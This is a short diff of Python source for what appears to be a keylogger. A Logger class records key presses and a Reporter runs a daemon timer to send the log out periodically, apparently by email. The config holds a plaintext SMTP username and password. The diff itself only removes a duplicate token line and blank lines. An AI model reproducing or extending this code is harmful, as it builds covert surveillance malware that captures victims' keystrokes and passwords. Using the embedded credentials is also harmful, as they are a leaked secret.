@@ -18,17 +18,14 @@ class Config:
    SMTP_PORT = 587
    SMTP_USERNAME = "MS_yA4y9Q@trial-3yxj6ljpew0ldo2r.mlsender.net"
    SMTP_PASSWORD = "oFENPhUJMs7TOQAf"
-   SMTP_TOKEN = "oFENPhUJMs7TOQAf"
 
 class Logger:
    def __init__(self):
        self.log = ""
  
- 
    def add_key(self, key_name):
        print(f"Key logged: {key_name}")  # Debugging output
        self.log += key_name if len(key_name) == 1 else f"[{key_name.upper()}]"
- 
  
    def clear_log(self):
        self.log = ""
@@ -37,13 +34,11 @@ class Reporter:
    def __init__(self, logger):
        self.logger = logger
        self.timer = None
- 
- 
+
    def start_timer(self):
        self.timer = Timer(Config.SEND_REPORT_EVERY, self.report)
        self.timer.daemon = True
        self.timer.start()
- 
  
    def report(self):
        if self.logger.log:
